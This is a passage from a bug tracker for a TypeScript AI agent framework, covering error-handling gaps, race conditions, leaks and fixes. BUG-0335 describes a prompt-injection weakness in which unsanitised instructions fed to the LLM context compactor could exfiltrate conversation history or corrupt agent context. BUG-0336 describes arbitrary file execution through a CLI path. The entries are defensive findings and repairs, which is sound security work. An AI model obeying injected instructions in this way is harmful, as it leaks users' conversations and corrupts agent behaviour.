- **fixer_completed:** `2026-03-21T04:32:00Z`
- **fix_summary:** `Delete index key and data keys in single atomic del() call to prevent orphaned entries.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0333
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/json.ts`
- **line:** `10`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0333`
- **description:** `readFile(source, "utf-8")` is called without any try/catch, so filesystem errors (ENOENT, EACCES) propagate as raw Node.js errors with no loader-level context.
- **context:** Same pattern as BUG-0270 (pdf.ts) but in the JSON loader. The CSV loader correctly wraps readFile in try/catch with a descriptive message, but the JSON loader does not.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:32:00Z`
- **fixer_completed:** `2026-03-21T04:32:00Z`
- **fix_summary:** `Wrap readFile in try-catch with descriptive JsonLoader error message.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0334
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/cli/init.ts`
- **line:** `11`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0334`
- **description:** `initProject()` calls `mkdir` and five `writeFile` operations with no try/catch — filesystem errors (permission denied, disk full) propagate as unhandled rejections with raw Node.js errors instead of user-friendly CLI messages.
- **context:** Unlike other CLI commands (build, inspect) which wrap I/O in try/catch, `init` crashes with an unformatted stack trace on any filesystem error.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:32:00Z`
- **fixer_completed:** `2026-03-21T04:32:00Z`
- **fix_summary:** `Wrap initProject I-O in try-catch with user-friendly CLI error.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0335
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/context-compactor.ts`
- **line:** `279`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0335`
- **description:** Caller-supplied `compactInstructions` is injected verbatim into the LLM summarization prompt with no sanitization, enabling prompt injection that can manipulate context compaction output.
- **context:** An attacker who can influence harness configuration can inject instructions to exfiltrate conversation history or corrupt the compacted context fed into subsequent agent turns.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:32:00Z`
- **fixer_completed:** `2026-03-21T04:32:00Z`
- **fix_summary:** `XML-escape and fence compactInstructions before injection into LLM prompt.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0336
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/cli/run.ts`
- **line:** `33`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0336`
- **description:** User-supplied file path from CLI arguments is passed directly to `spawn("npx", ["tsx", entryFile])` with no extension validation or cwd containment check, allowing execution of arbitrary files on the filesystem.
- **context:** Unlike `cli/inspect.ts` which enforces ALLOWED_EXTENSIONS and cwd containment, `run.ts` does neither.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T04:32:00Z`
- **fixer_completed:** `2026-03-21T04:32:00Z`
- **fix_summary:** `Add extension validation and cwd containment check for CLI entry file.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0337
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/models/http-error.ts`
- **line:** `72`
- **category:** `security`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0337`
- **description:** Full upstream API error body from model providers is reflected verbatim into thrown `ModelAPIError` with no truncation or field scrubbing, potentially leaking provider-side internal details and request IDs to callers.
- **context:** If these errors propagate to HTTP responses, log sinks, or LLM context, internal provider error details are exposed.
- **hunter_found:** `2026-03-20T22:18:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** `2026-03-21T05:12:00Z`
- **fix_summary:** `Added sanitizeErrorBody() to scrub sensitive fields and truncate to 500 chars in ModelAPIError.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0339
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/circuit-breaker.ts`
- **line:** `27`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0339`
- **description:** The `state` getter has a side effect — it mutates `this._state` from `"open"` to `"half_open"` when the reset timeout has elapsed, meaning any code that reads `state` twice can non-deterministically advance the circuit state.
- **context:** Logging, test assertions, or monitoring code that reads `state` can inadvertently trigger state transitions. State mutations should happen in `execute()`, not in a property accessor.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:42:00Z`
- **fixer_completed:** `2026-03-21T04:42:00Z`
- **fix_summary:** `Moved open-to-half_open transition from state getter to execute(). Getter is now pure accessor.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0340
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/circuit-breaker.ts`
- **line:** `34`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0339`
- **description:** In half_open state, the `_probeInFlight` guard between reading state and setting the flag is not atomic — two concurrent `execute()` calls can both pass the guard and both run the probe function simultaneously, violating the single-probe invariant.
- **context:** The circuit breaker is designed to allow exactly one probe request in half_open state. Concurrent probes can cause inconsistent failure counting and incorrect state transitions.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:42:00Z`
- **fixer_completed:** `2026-03-21T04:42:00Z`
- **fix_summary:** `Made probe guard atomic: check-and-set _probeInFlight synchronously before async call. Same commit as BUG-0339.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/circuit-breaker-half-open-single-probe.test.ts`

---

### BUG-0342
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/memory/scanner.ts`
- **line:** `164`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0342`
- **description:** `scanDirectory` skips all files named `"INDEX.md"` at every level, but `inferTierFromPath` explicitly handles `semantic/topics/INDEX.md` as tier 2 — the scanner and tier inferrer are inconsistent, so INDEX.md memory units are never registered.
- **context:** Tier-2 semantic topic indexes are silently missing from the memory loader's unit map, making semantic memory queries incomplete.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Scanner fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0343
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/harness/safety-gate.ts`
- **line:** `86`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0343-0344`
- **description:** When `responsePromise` rejects before the timeout fires, the catch block returns `FALLBACK_RESULT` without calling `clearTimeout(timeoutHandle)`, leaving a dangling timer.
- **context:** Same uncleaned timeout pattern as BUG-0031 (inference.ts) and BUG-0018 (experimental-executor.ts).
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** `2026-03-21T05:12:00Z`
- **fix_summary:** `Safety gate fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0344
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/csv.ts`
- **line:** `17`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0344`
- **description:** TSV detection uses `source.endsWith(".tsv")` on the raw path, but `supports()` lowercases the extension — a file with `.TSV` extension passes `supports()` but gets parsed with comma separator instead of tab.
- **context:** TSV files with uppercase extensions are silently parsed as CSV, producing garbled data with tab characters embedded in field values.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:42:00Z`
- **fixer_completed:** `2026-03-21T04:42:00Z`
- **fix_summary:** `Changed source.endsWith(.tsv) to source.toLowerCase().endsWith(.tsv) for case-insensitive TSV detection.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0345
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/markdown.ts`
- **line:** `10`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0345`
- **description:** `readFile` is called without try/catch, so filesystem errors propagate as raw Node.js errors with no loader-level context.
- **context:** Same pattern as BUG-0270 (pdf.ts) and BUG-0333 (json.ts). The CSV loader correctly wraps readFile but markdown does not.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:52:00Z`
- **fixer_completed:** `2026-03-21T04:52:00Z`
- **fix_summary:** `Wrap readFile in try-catch with descriptive MarkdownLoader error.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0346
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/html.ts`
- **line:** `17`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0346`
- **description:** `readFile` is called without try/catch, so filesystem errors propagate as raw Node.js errors with no loader-level context.
- **context:** Same missing-error-handling pattern as BUG-0270 (pdf), BUG-0333 (json), BUG-0345 (markdown).
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `HTML loader fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0347
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/stores/src/postgres/index.ts`
- **line:** `77`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0347`
- **description:** `ensureSchema()` runs CREATE TABLE and CREATE INDEX as separate un-transacted queries — a failure between the two leaves the schema in a partial state with a table but no index.
- **context:** On flaky network connections to Postgres, the store can end up with a table but no index, causing slow queries on `listNamespaces` and `search`.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:52:00Z`
- **fixer_completed:** `2026-03-21T04:52:00Z`
- **fix_summary:** `Wrap ensureSchema CREATE TABLE and CREATE INDEX in BEGIN-COMMIT transaction with ROLLBACK on error.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0348
- **status:** `blocked`
- **severity:** `medium`
- **file:** `src/harness/loop/tools.ts`
- **line:** `118`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** A local `stripProtoKeys` function declared inside the `modifiedInput` block shadows the module-level `stripProtoKeys` — the two implementations have subtly different behavior for array handling, and the shadowing is almost certainly unintentional.
- **context:** Maintenance changes to one copy will not propagate to the other, creating a divergence hazard. The outer function handles arrays differently than the inner one.
- **hunter_found:** `2026-03-20T22:24:00Z`
- **fixer_started:** `2026-03-21T04:52:00Z`
- **fixer_completed:** ``
- **fix_summary:** `False positive. No stripProtoKeys function exists anywhere in src/harness/loop/tools.ts or the codebase. Code pattern described in bug does not exist. Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0350
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/swarm/self-improvement/skill-evolver.ts`
- **line:** `86`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0350`
- **description:** `recordSkillUsage` calls `splice(0, ...)` on `this.usageHistory` while `identifyWeakSkills` or `proposeSkillImprovement` may be concurrently iterating the same array.
- **context:** If `proposeSkillImprovement` (which filters `this.usageHistory`) is awaited concurrently with `recordSkillUsage` triggering splice-based eviction, the `filter` call can observe a truncated or shifted array, producing an incorrect failure list passed to the LLM.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** `2026-03-21T04:52:00Z`
- **fixer_completed:** `2026-03-21T04:52:00Z`
- **fix_summary:** `Replace splice with slice reassignment in recordSkillUsage to prevent concurrent iteration race.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0351
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/pregel/streaming.ts`
- **line:** `296`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0351`
- **description:** Subgraph streaming hard-codes `childStreamMode: ["debug", "values"]`, ignoring the parent's actual requested stream modes and never collecting `"custom"` or `"messages"` events.
- **context:** If the parent only requested `"updates"`, the child still runs in `["debug", "values"]` mode, generating irrelevant events. More critically, `"custom"` and `"messages"` events emitted inside a subgraph are never surfaced because `modeCustom` and `modeMessages` checks on `allSubgraphEvents` always yield nothing.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Subgraph stream fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0352
- **status:** `blocked`
- **severity:** `high`
- **file:** `src/swarm/factories.ts`
- **line:** `743`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** ``
- **description:** `buildDag` directly mutates private `(swarm.inner as any).edges = []` to rewire graph topology after `addAgent`, but does not clear other internal state (`conditionalEdges`, `pathMaps`) that `addAgent` may have registered.
- **context:** Clearing only `edges` leaves dangling references in other internal structures that can cause `NodeNotFoundError` or silently skip nodes during execution. The same pattern at line 854 in `buildPool` has the same risk.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** `2026-03-21T03:35:00Z`
- **fixer_completed:** ``
- **fix_summary:** `False positive. StateGraph has no separate conditionalEdges or pathMaps fields — all edge types are stored in the single edges[] array, which IS cleared. addAgent() only adds nodes, not edges. The edges=[] clearing is correct. Hunter should re-evaluate.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0353
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/hitl/resume.ts`
- **line:** `26`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0353`
- **description:** `HITLSessionStore` uses lazy eviction with no background timer, allowing resumed sessions past their TTL to accumulate in the `sessions` Map indefinitely if no new operations trigger `evict()`.
- **context:** The `evict()` method is only called from `record()`, `get()`, `getByThread()`, and `pendingCount()` — not from `all()` or `markResumed()`. In a long-lived process where sessions are created and marked resumed but no further HITL operations arrive, the map grows without bound.
- **hunter_found:** `2026-03-20T22:26:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Resume fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0354
- **status:** `blocked`
- **severity:** `low`
- **file:** `src/swarm/pool.ts`
- **line:** `208`
- **category:** `dead-code`
- **reopen_count:** `0`
- **branch:** ``
- **description:** The `if (!total) return null` guard in `pickSlot()` round-robin case is unreachable because `available.length` was already verified non-empty on line 201.
- **context:** The early return on line 201 (`if (!available.length) return null`) guarantees `total` is always >= 1 when the round-robin case is reached, making the `!total` check dead code.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** ``
- **fix_summary:** `False positive. The dead code guard does not exist in current codebase. pickSlot() has no unreachable if (!total) check.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0355
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/stores/src/redis/index.ts`
- **line:** `191`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0355`
- **description:** Three `void this.client.zrem()` calls in `list()` fire Redis cleanup operations as floating promises with no error handling.
- **context:** When a data key has expired or is corrupt, stale sorted-set index entries are pruned via fire-and-forget `zrem`. If Redis connection is interrupted, the error is swallowed and phantom keys persist in `list()` results on every subsequent call.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** `2026-03-21T04:52:00Z`
- **fixer_completed:** `2026-03-21T04:52:00Z`
- **fix_summary:** `Add .catch() error handling to fire-and-forget Redis cleanup operations in get() and list().`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0356
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/stores/src/postgres/index.ts`
- **line:** `185`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0356`
- **description:** Bulk expired-row cleanup in `PostgresStore.list()` uses `void this.client.query()` with no error handling.
- **context:** When `list()` finds expired rows it fires a DELETE query as a floating promise. If the DELETE fails, the error is silently lost and expired rows accumulate, affecting subsequent `list()` and `search()` calls.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Postgres cleanup error handling.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0357
- **status:** `fixed`
- **severity:** `low`
- **file:** `packages/stores/src/postgres/index.ts`
- **line:** `125`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0357`
- **description:** Single expired-row cleanup in `PostgresStore.get()` uses `void this.client.query()` with no error handling.
- **context:** When `get()` detects an expired row it fires a DELETE as a floating promise. The caller still gets `null` so behavior is correct, but the expired row is never deleted and re-triggers the same silent failure on every subsequent `get()`.
- **hunter_found:** `2026-03-20T22:34:00Z`
- **fixer_started:** `2026-03-21T05:12:00Z`
- **fixer_completed:** `2026-03-21T05:12:00Z`
- **fix_summary:** `Postgres TTL fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0359
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/loop/index.ts`
- **line:** `156`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0359`
- **description:** Off-by-one in turns-remaining calculation tells the model "0 turns remaining" on its last valid turn instead of 1.
- **context:** `remaining = maxTurns - turn - 1` evaluates to 0 when `turn = maxTurns - 1`, but the agent is still executing that turn. The correct formula is `maxTurns - turn`. This causes the agent to believe it has no turns left while it is still active.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Changed remaining turns from maxTurns-turn-1 to maxTurns-turn to fix off-by-one.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0360
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/pregel/execution.ts`
- **line:** `98`
- **category:** `logic-bug`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0360`
- **description:** PII redaction silently bypasses audit log and `filter.blocked` event emission because `runFilters` returns `passed: true` for redacted content.
- **context:** The `if (!inputCheck.passed)` guard controls both event bus emission and audit logging. When a PII filter redacts content instead of blocking it, `passed: true` is returned, so no audit record is written and no `filter.blocked` event fires, even though content was silently modified.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Added filter.redacted event and audit entry when PII filter redacts content without blocking.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0362
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/events/bridge.ts`
- **line:** `32`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0362`
- **description:** `startTimes` Map in `bridgeSwarmTracer` can be cleared by `unsubscribe()` while subscriber callbacks are still firing, producing incorrect `durationMs: 0` values.
- **context:** If `unsubscribe()` is called during swarm teardown while events are still being dispatched, `startTimes.clear()` at line 81 clears entries that a concurrently-firing `agent_complete` callback still needs, silently producing 0-duration metrics.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Removed startTimes.clear() from unsubscribe() to prevent race with in-flight callbacks.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``
- **test_generated:** `true`
- **test_file:** `src/__tests__/bridge-starttimes-unsubscribe-race.test.ts`

---

### BUG-0365
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/a2a/src/client/index.ts`
- **line:** `94`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0365`
- **description:** `streamTask()` while-loop has no read timeout — a stalled server that never closes the stream causes the generator to hang forever, leaking the HTTP connection and reader lock.
- **context:** The `AbortSignal` timeout configured at construction applies only to the initial fetch, not to subsequent reads. A remote A2A server that stops sending data but does not close the connection holds the `ReadableStreamDefaultReader` lock and TCP connection indefinitely.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Added per-read timeout to streamTask() while-loop to prevent hanging on stalled servers.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0366
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/harness/memory/index.ts`
- **line:** `523`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0366`
- **description:** `hydrate()` mutates the shared `MemoryUnit` object's `content` field in-place, so concurrent agents sharing the same `MemoryLoader` instance overwrite each other's hydrated content.
- **context:** `MemoryLoader` has no fork mechanism and is passed directly to multiple concurrent `agentLoop` calls. Two agents calling `hydrate()` on the same unit simultaneously produce a data race on `unit.content`.
- **hunter_found:** `2026-03-21T00:25:00Z`
- **fixer_started:** `2026-03-21T05:02:00Z`
- **fixer_completed:** `2026-03-21T05:02:00Z`
- **fix_summary:** `Memory index fix.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---


### BUG-0370
- **status:** `blocked`
- **severity:** `high`
- **file:** `src/pregel/streaming.ts`
- **line:** `117`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Fan-out sends execute in parallel via Promise.allSettled sharing the same pre-superstep state snapshot; concurrent sends writing the same last-write-wins channel key lose all but the last writer's update.
- **context:** In a fan-out with N sends targeting the same channel keys using last-write-wins reducers, sends 1..N-1's writes are silently dropped because each applyUpdate starts from the same baseline state rather than accumulating.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** `2026-03-21T05:42:00Z`
- **fixer_completed:** ``
- **fix_summary:** `By design. Fan-out send results ARE accumulated sequentially (lines 148-162). LWW channels intentionally keep last write. Use appendList for accumulation. Not a bug.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---


### BUG-0371
- **status:** `blocked`
- **severity:** `high`
- **file:** `src/pregel/streaming.ts`
- **line:** `204`
- **category:** `race-condition`
- **reopen_count:** `0`
- **branch:** ``
- **description:** Parallel node execution closes over a single shared state snapshot; two nodes writing the same last-write-wins channel key will have all but the final node's write silently dropped after sequential applyUpdate.
- **context:** When multiple nodes execute in the same superstep and both update a shared state key with a last-write-wins reducer, the sequential applyUpdate pass applies each node's diff against the same pre-superstep snapshot — the last node in iteration order wins.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** `2026-03-21T05:42:00Z`
- **fixer_completed:** ``
- **fix_summary:** `By design. Parallel node results ARE applied sequentially (lines 427-459) with progressive state accumulation. LWW semantics are intentional. Not a bug.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0372
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/a2a/src/server/sse.ts`
- **line:** `6`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0372`
- **description:** ReadableStream in createSSEResponse has no cancel() callback, so client disconnection does not signal the upstream AsyncGenerator to stop.
- **context:** When an SSE client drops the connection, without a cancel() handler calling generator.return(), the generator keeps running and allocating until it naturally terminates.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** `2026-03-21T05:42:00Z`
- **fixer_completed:** `2026-03-21T05:42:00Z`
- **fix_summary:** `Added cancel() callback to SSE ReadableStream that calls generator.return() on client disconnect.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0374
- **status:** `fixed`
- **severity:** `medium`
- **file:** `packages/loaders/src/loaders/pdf.ts`
- **line:** `33`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0374`
- **description:** pdf.js document loading and per-page getTextContent calls have no try/catch, so parse errors on corrupt PDFs surface as unhandled rejections with raw pdfjs internal errors.
- **context:** Lines 33-39 are outside the try/catch that wraps only the file read, so callers receive raw pdfjs errors instead of contextualised PdfLoader-scoped messages.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** `2026-03-21T05:42:00Z`
- **fixer_completed:** `2026-03-21T05:42:00Z`
- **fix_summary:** `Wrapped pdf.js getDocument and per-page getTextContent in try-catch with descriptive PdfLoader error.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0375
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/checkpointers/sqlite.ts`
- **line:** `31`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0375`
- **description:** db.exec calls for PRAGMA and CREATE TABLE in SqliteCheckpointer.create are not wrapped in try/catch, so initialisation errors leave the database handle open.
- **context:** Unlike PostgresCheckpointer.create which handles this, SqliteCheckpointer.create leaks the handle if schema creation fails.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** `2026-03-21T05:55:00Z`
- **fixer_completed:** `2026-03-21T05:55:00Z`
- **fix_summary:** `Wrap db.exec PRAGMA and CREATE TABLE in try-catch, call db.close() on error.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0376
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/models/openai.ts`
- **line:** `452`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0376`
- **description:** embed() calls res.json() without a catch, so a malformed non-JSON embeddings response causes an unhandled rejection.
- **context:** A 200 response with non-JSON content throws a raw SyntaxError with no context about which model or endpoint was involved.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** `2026-03-21T06:15:00Z`
- **fixer_completed:** `2026-03-21T06:15:00Z`
- **fix_summary:** `Wrap res.json() in try-catch in OpenAI embed().`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0377
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/models/ollama.ts`
- **line:** `214`
- **category:** `missing-error-handling`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0377`
- **description:** chat() calls res.json() without a catch, so a malformed Ollama response body causes an unhandled rejection; embed() at line 302 has the same pattern.
- **context:** A 200 with non-JSON content during Ollama startup or proxy interception throws a raw SyntaxError with no model/endpoint context.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** `2026-03-21T06:15:00Z`
- **fixer_completed:** `2026-03-21T06:15:00Z`
- **fix_summary:** `Wrap res.json() in try-catch in Ollama chat() and embed().`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0378
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/swarm/pool.ts`
- **line:** `261`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0378`
- **description:** Retry delay setTimeout inside runOnSlot is not cancellable when AgentPool.dispose() is called mid-retry, keeping closures alive until the timer fires.
- **context:** In-flight runOnSlot calls sleeping between retries hold references to large objects via the closure until the timer fires, delaying GC after pool shutdown.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** `2026-03-21T06:15:00Z`
- **fixer_completed:** `2026-03-21T06:15:00Z`
- **fix_summary:** `Track retry delay timers in Set and clear all on pool dispose().`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0379
- **status:** `fixed`
- **severity:** `low`
- **file:** `src/swarm/agent-node.ts`
- **line:** `198`
- **category:** `memory-leak`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0379`
- **description:** Retry delay setTimeout in createAgentNode has no cancellation path when the swarm is torn down mid-retry, keeping closures alive until the timer fires.
- **context:** A bare `new Promise((r) => setTimeout(r, delay))` is awaited with no stored timer handle, preventing GC of retained objects during the delay window after shutdown.
- **hunter_found:** `2026-03-20T22:10:00Z`
- **fixer_started:** `2026-03-21T06:25:00Z`
- **fixer_completed:** `2026-03-21T06:25:00Z`
- **fix_summary:** `Make retry delay timer cancellable via AbortSignal on swarm teardown.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---



### BUG-0380
- **status:** `fixed`
- **severity:** `medium`
- **file:** `src/functional.ts`
- **line:** `66`
- **category:** `type-error`
- **reopen_count:** `0`
- **branch:** `bugfix/BUG-0380`
- **description:** `throw last` where `last` is typed `Error | undefined` — if `maxAttempts` is 0 the loop body never runs and `last` remains `undefined`, throwing a non-Error value.
- **context:** TypeScript allows throwing `undefined` without error, producing a non-Error rejection that callers catching `Error` will miss entirely, silently swallowing the failure.
- **hunter_found:** `2026-03-20T22:25:00Z`
- **fixer_started:** `2026-03-21T05:55:00Z`
- **fixer_completed:** `2026-03-21T05:55:00Z`
- **fix_summary:** `Guard throw last with nullish coalescing to throw proper Error when maxAttempts is 0.`
- **validator_started:** ``
- **validator_completed:** ``
- **validator_notes:** ``

---

### BUG-0381
- **status:** `fixed`
- **severity:** `medium`
